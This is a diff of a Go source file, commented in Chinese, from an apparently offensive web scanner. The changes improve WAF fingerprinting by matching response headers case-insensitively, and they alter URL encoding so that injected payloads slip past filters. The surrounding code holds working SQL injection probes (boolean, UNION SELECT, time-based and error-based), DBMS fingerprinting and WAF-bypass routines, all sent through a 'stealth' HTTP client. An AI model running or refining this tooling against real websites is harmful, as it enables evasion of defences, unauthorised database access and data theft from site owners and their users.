@@ -64,13 +64,13 @@ type WAFRule struct {
 // WAF_DB: 30+ WAF 指纹（国产 + 国际，学自 wafw00f）
 var WAF_DB = []WAFRule{
 	// 国产
-	{"header", `Server:\s*qianxin-waf`, "奇安信 WAF"},
-	{"header", `WZWS-Ray:`, "360 网站卫士"},
-	{"header", `X-Powered-By-360WZB`, "360 WAF"},
-	{"header", `Server:\s*YUNDUN`, "阿里云盾"},
-	{"header", `X-Cache:\s*YUNDUN`, "阿里云盾"},
-	{"cookie", `yd_cookie=`, "阿里云盾"},
-	{"header", `X-Powered-by-Anquanbao`, "安全宝"},
+	{"header", `(?i)Server:\s*qianxin-waf`, "奇安信 WAF"},
+	{"header", `(?i)WZWS-Ray:`, "360 网站卫士"},
+	{"header", `(?i)X-Powered-By-360WZB`, "360 WAF"},
+	{"header", `(?i)Server:\s*YUNDUN`, "阿里云盾"},
+	{"header", `(?i)X-Cache:\s*YUNDUN`, "阿里云盾"},
+	{"cookie", `(?i)yd_cookie=`, "阿里云盾"},
+	{"header", `(?i)X-Powered-by-Anquanbao`, "安全宝"},
 	{"body", `aqb_cc/error/`, "安全宝"},
 	{"body", `wzws-waf-cgi/`, "360 WAF"},
 	{"body", `wangshan\.360\.cn`, "360 WAF"},
@@ -85,35 +85,35 @@ var WAF_DB = []WAFRule{
 	{"body", `拦截|已被拦截|访问被拒绝|请求被阻止`, "国产 WAF(通用)"},
 	{"body", `护卫神|主机卫士`, "国产主机卫士"},
 	// 国际
-	{"header", `CF-RAY:`, "Cloudflare"},
-	{"header", `Server:\s*cloudflare`, "Cloudflare"},
+	{"header", `(?i)CF-RAY:`, "Cloudflare"},
+	{"header", `(?i)Server:\s*cloudflare`, "Cloudflare"},
 	{"body", `cf-chl|challenge-platform`, "Cloudflare"},
-	{"header", `X-Sucuri-ID:`, "Sucuri"},
-	{"header", `X-Sucuri-Cache:`, "Sucuri"},
-	{"header", `Server:\s*sucuri`, "Sucuri"},
-	{"header", `X-Akamai-Transformed:`, "Akamai"},
-	{"header", `X-Akamai-Request-ID`, "Akamai"},
-	{"header", `X-CDN:.*Incapsula`, "Imperva Incapsula"},
-	{"header", `X-Iinfo:`, "Imperva Incapsula"},
+	{"header", `(?i)X-Sucuri-ID:`, "Sucuri"},
+	{"header", `(?i)X-Sucuri-Cache:`, "Sucuri"},
+	{"header", `(?i)Server:\s*sucuri`, "Sucuri"},
+	{"header", `(?i)X-Akamai-Transformed:`, "Akamai"},
+	{"header", `(?i)X-Akamai-Request-ID`, "Akamai"},
+	{"header", `(?i)X-CDN:.*Incapsula`, "Imperva Incapsula"},
+	{"header", `(?i)X-Iinfo:`, "Imperva Incapsula"},
 	{"body", `incapsula|imperva`, "Imperva Incapsula"},
-	{"header", `Mod_Security`, "ModSecurity"},
+	{"header", `(?i)Mod_Security`, "ModSecurity"},
 	{"body", `mod_security|modsecurity`, "ModSecurity"},
-	{"header", `X-Powered-By:.*(?:WAF|barracuda)`, "Barracuda WAF"},
-	{"header", `Server:\s*BigIP|X-Cnection:.*close`, "F5 BIG-IP"},
+	{"header", `(?i)X-Powered-By:.*(?:WAF|barracuda)`, "Barracuda WAF"},
+	{"header", `(?i)Server:\s*BigIP|X-Cnection:.*close`, "F5 BIG-IP"},
 	{"body", `F5 Networks|BIG-IP`, "F5 BIG-IP"},
-	{"header", `X-WAF:`, "Generic WAF"},
-	{"header", `X-ASEN:`, "AE Secure"},
+	{"header", `(?i)X-WAF:`, "Generic WAF"},
+	{"header", `(?i)X-ASEN:`, "AE Secure"},
 	{"body", `aeSecure-code`, "AE Secure"},
-	{"header", `AL-SESS|AL-LB`, "Airlock"},
+	{"header", `(?i)AL-SESS|AL-LB`, "Airlock"},
 	{"body", `Server detected a syntax error`, "Airlock"},
-	{"header", `Server:\s*ArvanCloud`, "ArvanCloud"},
+	{"header", `(?i)Server:\s*ArvanCloud`, "ArvanCloud"},
 	{"body", `Blocked by.*Armor|Armor support ticket`, "Armor Defense"},
-	{"header", `ASPA-WAF`, "ASPA"},
+	{"header", `(?i)ASPA-WAF`, "ASPA"},
 	{"body", `x-dotdefender`, "dotDefender"},
-	{"header", `Server:\s*Wallarm`, "Wallarm"},
-	{"header", `Server:\s*zscaler`, "Zscaler"},
-	{"header", `X-Zenomy:`, "Zenedge"},
-	{"header", `Server:\s*Wordfence`, "Wordfence"},
+	{"header", `(?i)Server:\s*Wallarm`, "Wallarm"},
+	{"header", `(?i)Server:\s*zscaler`, "Zscaler"},
+	{"header", `(?i)X-Zenomy:`, "Zenedge"},
+	{"header", `(?i)Server:\s*Wordfence`, "Wordfence"},
 	{"body", `wordfence`, "Wordfence"},
 }
 
@@ -134,30 +134,33 @@ var wafProbes = []string{
 // DetectWAF 对目标检测 WAF
 func DetectWAF(baseURL, param string, c *stealth.Client) WAFDetection {
 	d := WAFDetection{TotalProbes: len(wafProbes)}
-	sBase, bBase, _ := get(baseURL, c)
+	sBase, bBase, _, _ := get(baseURL, c)
 	baseLen := len(bBase)
 	matched := map[string]bool{}
 
 	for _, p := range wafProbes {
 		u := mutate(baseURL, param, p)
-		s, b, _ := get(u, c)
+		s, b, hdrs, _ := get(u, c)
 		isBlock := false
 		if s == 403 || s == 406 || s == 429 || s == 493 {
 			isBlock = true
 		} else if s == sBase && len(b) < max(baseLen*3/10, 100) {
 			isBlock = true
 		}
-		// 指纹匹配
+		// 指纹匹配：header 型匹配响应头，body 型匹配响应体，cookie 型匹配全量
+		blob := b + "\n" + hdrs
 		for _, r := range WAF_DB {
 			re, err := regexp.Compile(r.Regex)
 			if err != nil {
 				continue
 			}
-			blob := b
-			if r.Source == "header" || r.Source == "cookie" {
-				blob = b // header 简化（响应头已并入 body）
+			target := blob
+			if r.Source == "header" {
+				target = hdrs
+			} else if r.Source == "body" {
+				target = b
 			}
-			if re.MatchString(blob) {
+			if re.MatchString(target) {
 				matched[r.Name] = true
 			}
 		}
@@ -199,29 +202,37 @@ type client struct {
 	mu     sync.Mutex
 }
 
-func get(u string, c *stealth.Client) (int, string, time.Duration) {
+func get(u string, c *stealth.Client) (int, string, string, time.Duration) {
 	t0 := time.Now()
 	req, err := http.NewRequest("GET", u, nil)
 	if err != nil {
-		return 0, "", 0
+		return 0, "", "", 0
 	}
 	resp, err := c.Do(req)
 	if err != nil {
-		return 0, "", time.Since(t0)
+		return 0, "", "", time.Since(t0)
 	}
 	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
 	resp.Body.Close()
-	return resp.StatusCode, string(body), time.Since(t0)
+	// 序列化响应头（WAF 指纹匹配用）
+	var hb strings.Builder
+	for k, v := range resp.Header {
+		hb.WriteString(k + ": " + strings.Join(v, ", ") + "\n")
+	}
+	return resp.StatusCode, string(body), hb.String(), time.Since(t0)
 }
 
 func mutate(baseURL, param, value string) string {
-	// 直接用 Query.Encode（空格->%20, 引号->%27），再还原绕过字符 / *
+	// 空格编码为 %20（标准 URL 编码，服务器 unquote 认识）
+	// 不能用 Query.Encode 的 +（unquote 不认 +，WAF 会漏检）
 	u, err := url.Parse(baseURL)
 	if err == nil {
 		q := u.Query()
 		q.Set(param, value)
 		u.RawQuery = q.Encode()
 		out := u.String()
+		// Query.Encode 用 + 编码空格 → 改回 %20
+		out = strings.ReplaceAll(out, "+", "%20")
 		out = strings.ReplaceAll(out, "%2A", "*")
 		out = strings.ReplaceAll(out, "%2F", "/")
 		return out
@@ -231,7 +242,7 @@ func mutate(baseURL, param, value string) string {
 
 // ---- DBMS 指纹（error-based 识别）----
 func fingerprintDBMS(baseURL, param string, c *stealth.Client) string {
-	status, body, _ := get(mutate(baseURL, param, "'"), c)
+	status, body, _, _ := get(mutate(baseURL, param, "'"), c)
 	if status >= 400 || strings.Contains(strings.ToLower(body), "error") || strings.Contains(strings.ToLower(body), "syntax") {
 		lower := strings.ToLower(body)
 		switch {
@@ -264,9 +275,9 @@ func fingerprintDBMS(baseURL, param string, c *stealth.Client) string {
 
 // ---- 4 类注入检测 ----
 func checkBoolean(baseURL, param string, p DBMS, c *stealth.Client) bool {
-	_, _, _ = get(baseURL, c)
-	_, b2, _ := get(mutate(baseURL, param, "1 AND "+p.BoolTrue), c)
-	_, b3, _ := get(mutate(baseURL, param, "1 AND "+p.BoolFalse), c)
+	_, _, _, _ = get(baseURL, c)
+	_, b2, _, _ := get(mutate(baseURL, param, "1 AND "+p.BoolTrue), c)
+	_, b3, _, _ := get(mutate(baseURL, param, "1 AND "+p.BoolFalse), c)
 	if len(b2) != len(b3) {
 		return true
 	}
@@ -277,11 +288,11 @@ func checkBoolean(baseURL, param string, p DBMS, c *stealth.Client) bool {
 }
 
 func checkUnion(baseURL, param string, p DBMS, c *stealth.Client) (bool, string) {
-	_, baseBody, _ := get(baseURL, c)
+	_, baseBody, _, _ := get(baseURL, c)
 	baseLen := len(baseBody)
 	for _, cols := range p.UnionCols {
 		u := mutate(baseURL, param, "-1 UNION SELECT "+cols+"-- ")
-		s, body, _ := get(u, c)
+		s, body, _, _ := get(u, c)
 		if s != 200 && s != 0 {
 			continue
 		}
@@ -296,13 +307,13 @@ func checkTime(baseURL, param string, p DBMS, c *stealth.Client) bool {
 	if p.Sleep == "" {
 		return false
 	}
-	_, _, baseTime := get(baseURL, c)
-	_, _, sleepTime := get(mutate(baseURL, param, "1 AND "+p.Sleep), c)
+	_, _, _, baseTime := get(baseURL, c)
+	_, _, _, sleepTime := get(mutate(baseURL, param, "1 AND "+p.Sleep), c)
 	return sleepTime-baseTime > 1500*time.Millisecond
 }
 
 func checkError(baseURL, param string, c *stealth.Client) bool {
-	_, body, _ := get(mutate(baseURL, param, "'"), c)
+	_, body, _, _ := get(mutate(baseURL, param, "'"), c)
 	lower := strings.ToLower(body)
 	terms := []string{"syntax error", "sqlite", "mysql", "postgres", "mssql", "unterminated",
 		"you have an error", "warning:", "unexpected"}
@@ -367,7 +378,7 @@ func BypassWAF(baseURL, param, payload string, c *stealth.Client) (bool, string,
 	blockWords := []string{"403 forbidden", "access denied", "intercepted", "blocked", "waf", "拦截"}
 	for _, v := range buildVariants(payload) {
 		u := mutate(baseURL, param, v.Payload)
-		s, b, _ := get(u, c)
+		s, b, _, _ := get(u, c)
 		isBlock := s == 403 || s == 406 || s == 429 || s == 493
 		for _, w := range blockWords {
 			if strings.Contains(strings.ToLower(b), w) {
@@ -453,8 +464,8 @@ func ScanBypass(baseURL string, params []string, bypassPayload string, c *stealt
 		}
 		detected := false
 		for _, v := range variants {
-			_, bT, _ := get(mutate(baseURL, param, v[0]), c)
-			_, bF, _ := get(mutate(baseURL, param, v[1]), c)
+			_, bT, _, _ := get(mutate(baseURL, param, v[0]), c)
+			_, bF, _, _ := get(mutate(baseURL, param, v[1]), c)
 			if len(bT) != len(bF) {
 				detected = true
 				break
